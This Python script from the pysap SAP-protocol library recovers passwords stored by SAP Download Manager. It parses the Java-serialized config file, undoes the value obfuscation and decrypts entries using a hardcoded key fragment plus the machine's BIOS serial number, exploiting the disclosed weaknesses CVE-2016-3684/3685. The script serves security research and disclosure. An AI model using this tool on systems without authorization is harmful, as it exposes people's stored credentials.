#!/usr/bin/env python2
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
from sys import platform
from struct import pack, unpack
from subprocess import check_output
from argparse import ArgumentParser
# External import
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
# Custom imports
import pysap


# Java serialization decoding. Taken from http://stackoverflow.com/a/16470856
def parse_java(f):

    def h(s):
        return ' '.join('%.2X' % ord(x) for x in s)  # format as hex

    def p(s):
        return sum(ord(x)*256**i for i, x in enumerate(reversed(s)))  # parse integer

    magic = f.read(2)
    assert magic == '\xAC\xED', h(magic)  # STREAM_MAGIC
    assert p(f.read(2)) == 5  # STREAM_VERSION
    handles = []

    def parse_obj():
        b = f.read(1)
        if not b:
            raise StopIteration  # not necessarily the best thing to throw here.
        if b == '\x70':  # p TC_NULL
            return None
        elif b == '\x71':  # q TC_REFERENCE
            handle = p(f.read(4)) - 0x7E0000  # baseWireHandle
            o = handles[handle]
            return o[1]
        elif b == '\x74':  # t TC_STRING
            string = f.read(p(f.read(2))).decode('utf-8')
            handles.append(('TC_STRING', string))
            return string
        elif b == '\x75':  # u TC_ARRAY
            data = []
            cls = parse_obj()
            size = p(f.read(4))
            handles.append(('TC_ARRAY', data))
            assert cls['_name'] in ('[B', '[I'), cls['_name']
            for x in range(size):
                data.append(f.read({'[B': 1, '[I': 4}[cls['_name']]))
            return data
        elif b == '\x7E':  # ~ TC_ENUM
            enum = {}
            enum['_cls'] = parse_obj()
            handles.append(('TC_ENUM', enum))
            enum['_name'] = parse_obj()
            return enum
        elif b == '\x72':  # r TC_CLASSDESC
            cls = {'fields': []}
            full_name = f.read(p(f.read(2)))
            cls['_name'] = full_name.split('.')[-1]  # i don't care about full path
            f.read(8)  # uid
            cls['flags'] = f.read(1)
            handles.append(('TC_CLASSDESC', cls))
            assert cls['flags'] in ('\2', '\3', '\x0C', '\x12'), h(cls['flags'])
            b = f.read(2)
            for i in range(p(b)):
                typ = f.read(1)
                name = f.read(p(f.read(2)))
                fcls = parse_obj() if typ in 'L[' else ''
                cls['fields'].append((name, typ, fcls.split('/')[-1]))  # don't care about full path
            b = f.read(1)
            assert b == '\x78', h(b)
            cls['parent'] = parse_obj()
            return cls
        # TC_OBJECT
        assert b == '\x73', (h(b), h(f.read(4)), repr(f.read(50)))
        obj = {'_cls': parse_obj()}
        obj['_name'] = obj['_cls']['_name']
        handle = len(handles)
        parents = [obj['_cls']]
        while parents[0]['parent']:
            parents.insert(0, parents[0]['parent'])
        handles.append(('TC_OBJECT', obj))
        for cls in parents:
            for name, typ, fcls in cls['fields'] if cls['flags'] in ('\2', '\3') else []:
                if typ == 'I':  # Integer
                    obj[name] = p(f.read(4))
                elif typ == 'S':  # Short
                    obj[name] = p(f.read(2))
                elif typ == 'J':  # Long
                    obj[name] = p(f.read(8))
                elif typ == 'Z':  # Bool
                    b = f.read(1)
                    assert p(b) in (0, 1)
                    obj[name] = bool(p(b))
                elif typ == 'F':  # Float
                    obj[name] = h(f.read(4))
                elif typ in 'BC':  # Byte, Char
                    obj[name] = f.read(1)
                elif typ in 'L[':  # Object, Array
                    obj[name] = parse_obj()
                else:  # Unknown
                    assert False, (name, typ, fcls)
            if cls['flags'] in ('\3', '\x0C'):  # SC_WRITE_METHOD, SC_BLOCKDATA
                b = f.read(1)
                if b == '\x77':  # see the readObject / writeObject methods
                    block = f.read(p(f.read(1)))
                    if cls['_name'].endswith('HashMap') or cls['_name'].endswith('Hashtable'):
                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/HashMap.java.html
                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/Hashtable.java.html
                        assert len(block) == 8, h(block)
                        size = p(block[4:])
                        obj['data'] = []  # python doesn't allow dicts as keys
                        for i in range(size):
                            k = parse_obj()
                            v = parse_obj()
                            obj['data'].append((k, v))
                        try:
                            obj['data'] = dict(obj['data'])
                        except TypeError:
                            pass  # non hashable keys
                    elif cls['_name'].endswith('HashSet'):
                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/HashSet.java.html
                        assert len(block) == 12, h(block)
                        size = p(block[-4:])
                        obj['data'] = []
                        for i in range(size):
                            obj['data'].append(parse_obj())
                    elif cls['_name'].endswith('ArrayList'):
                        # http://javasourcecode.org/html/open-source/jdk/jdk-6u23/java/util/ArrayList.java.html
                        assert len(block) == 4, h(block)
                        obj['data'] = []
                        for i in range(obj['size']):
                            obj['data'].append(parse_obj())
                    else:
                        assert False, cls['_name']
                    b = f.read(1)
                assert b == '\x78', h(b) + ' ' + repr(f.read(30))  # TC_ENDBLOCKDATA
        handles[handle] = ('py', obj)
        return obj
    objs = []
    while 1:
        try:
            objs.append(parse_obj())
        except StopIteration:
            return objs


def parse_config_file(filename, decrypt=False, serial_number=None):
    print("[*] Opening DLManager config file: %s" % filename)

    try:
        with open(filename, 'r') as fil:
            data = parse_java(fil)[0]["data"]
    except:
        print("[-] Error reading configuration file or invalid file")
        return

    print("[*] Read %d config values from config file" % len(data))
    for item in data:
        value = ""
        if isinstance(data[item], basestring):
            value = data[item]
        elif "value" in data[item]:
            value = data[item]["value"]
        elif "_name" in data[item] and data[item]["_name"] == "StringWrapper":
            value = data[item]["maBuffer"]
            if value:
                value = unwrap(value, decrypt, serial_number)
        print("[*] Key=%s, Value=%s" % (item, value))


def build_key(serial_number):
    key = "hgjZ@Fk*0!N%0Un*"
    if serial_number:
        key = serial_number + key
    return key[:16]


def decrypt(cipher_text, key):
    iv = "\x00" * 16
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
    plain_text = decryptor.update(cipher_text) + decryptor.finalize()
    plain_text = plain_text[0:-ord(plain_text[-1])]     # Unpad the plain text
    return plain_text


def unwrap(value, encrypted=False, serial_number=None):
    pos = len(value)
    unwrapped = []
    for i in range(len(value)):
        pos -= 1
        (item, ) = unpack(">i", value[pos])             # Unpack the int value
        item = item - 50 + pos                          # Apply the transformation
        (item, ) = unpack(">b", pack(">i", item)[3:])   # Pack as int and drop first 3 bytes
        unwrapped.append(item)

    if encrypted:
        cipher_text = b"".join([pack(">b", x) for x in unwrapped])
        key = build_key(serial_number)
        print("[*] Decrypt using key: %s" % key)
        unwrapped = decrypt(cipher_text, key)
        if len(unwrapped) == 0:
            print("[-] Decryption failed. Maybe used a wrong serial number?")

    else:
        try:
            unwrapped = b"".join(map(chr, unwrapped))
        except ValueError:
            print("[-] Invalid stored value. Maybe it's encrypted?")
            unwrapped = None

    return unwrapped


def retrieve_serial_number():
    if platform.startswith("linux"):
        return ""
    elif platform.startswith("win"):
        output = check_output(["wmic", "bios", "get", "serialnumber"])
        output = output.strip().split("\n")[1]
        return output
    elif platform.startswith("darwin"):
        raise NotImplementedError


# Main function
def main():
    # Parse command line options
    description = "This example script extract SAP's Download Manager stored passwords. For SAP Download Manager "   \
                  "versions before 2.1.140a, stored passwords were kept unencrypted. For versions between 2.1.140a " \
                  "and 2.1.142, the script should be able to decrypt the password given possible to obtain the "     \
                  "machine serial number. For more details on the encryption mechanism see CVE-2016-3685, "          \
                  "CVE-2016-3684 documented at " \
                  "https://www.coresecurity.com/advisories/sap-download-manager-password-weak-encryption."

    usage = "%(prog)s [options] -f <config filename>"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    parser.add_argument("-f", "--filename", dest="filename", metavar="FILE",
                        help="DLManager config filename")
    parser.add_argument("-e", "--encrypted", dest="encrypted", action="store_true",
                        help="If passwords are stored encrypted (version >= 2.1.140a)")
    parser.add_argument("-s", "--serial-number", dest="serial_number",
                        help="The machine's BIOS serial number")
    parser.add_argument("-r", "--retrieve-serial-number", dest="retrieve", action="store_true",
                        help="If the script should try to retrieve the serial number from the machine and use it for "
                             "decryption")
    options = parser.parse_args()

    if not options.filename:
        parser.error("[-] DLManager config filename required !")

    if options.retrieve:
        print("[*] Trying to retrieve the machine's serial number")
        options.serial_number = retrieve_serial_number()
        options.encrypted = True
        print("[*] Retrieved serial number: %s" % options.serial_number)

    if options.encrypted and Cipher is None:
        parser.error("[-] Cryptography library required to decrypt not found !")

    parse_config_file(options.filename, options.encrypted, options.serial_number)


if __name__ == "__main__":
    main()
